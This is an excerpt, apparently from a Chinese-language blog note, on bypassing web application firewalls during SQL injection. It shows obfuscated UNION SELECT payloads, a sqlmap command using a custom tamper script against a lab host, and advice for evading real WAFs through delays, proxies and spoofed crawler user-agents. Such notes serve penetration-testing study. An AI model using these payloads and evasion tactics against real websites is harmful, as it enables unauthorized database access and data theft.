...
permalink: /posts/web漏洞/sql注入/WAF绕过/
author: Rin
categories:
  - 笔记
tags:
...
[https://www.cnblogs.com/cute-puli/p/11146625.html](https://www.cnblogs.com/cute-puli/p/11146625.html)

[https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html](https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html)
...
?page_id=null%0A/**//**_**!50000%55nIOn**_**//**_**yoyu**_**/all/**/%0A/_!%53eLEct_/%0A/_nnaa_/+1,2,3,4…
...
3.@符号，select@^1.from users; @用于变量定义如**@**_**var_name**_，一个@表示用户定义，@@表示系统变量
...
![](https://images0.cnblogs.com/blog/536040/201402/251206222237074.jpg)
...
select _from table where a=1 union/_ and b=_/select 1,pass/_ limit */from users—
...
![](https://images0.cnblogs.com/blog/536040/201402/251226089128413.jpg)
...
![](https://images0.cnblogs.com/blog/536040/201402/251227410156281.jpg)
...
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627358949959-4cbf3867-913d-4001-a5cc-c8c18d30a767.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627358971787-04fcfdac-c29c-4a39-b08a-ec112c1758f4.png)
...
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627372390965-94e7bfb4-f66d-4232-b401-f9d6865536ef.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627372430678-1f67d0bc-0484-42da-b5d0-0c99184137d3.png)
...
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627374935616-b86b20d3-b3b1-4d47-b2d2-76c554cfce12.png)

可以看到的是代码并没有按照我们预期执行，我们添加代理看看到底是个什么情况

`python sqlmap.py -u "[http://10.1.1.120/Less-2/?id=1"](http://10.1.1.120/Less-2/?id=1") --tamper=rdog.py --proxy=[http://10.1.1.2:8888](http://10.1.1.2:8888)`启动burp

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375128795-9bede960-696c-4118-97ce-80532c43cc52.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375175612-3500c7bc-2c69-4e4e-8bd3-e5db48176519.png)

可以看到user-agent是`sqlmap/1.5.6.4#dev ([http://sqlmap.org)](http://sqlmap.org\))`，安全软件当中是禁止使用这种脚本客户端所以就被拦截，自然插件脚本也就没办法正常执行

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375768604-e010fce0-c100-43c5-b936-d39f4125f10a.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375791211-09d3e84a-94c9-484e-8f33-6ebb2cf88fd1.png)

最终找到漏洞

备注：在真实环境当中waf可能会配置流量访问也就是说你访问的速度过快会将你访问的ip拉入黑名单，对此我们使用的策略是`延时，代理，爬虫白名单`

搜索引擎爬虫user-agent信息：[https://blog.csdn.net/liuxl57805678/article/details/89378720](https://blog.csdn.net/liuxl57805678/article/details/89378720)
...
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627377869786-598d2ceb-dcbc-482e-b4a6-97e8d6a99e24.png)
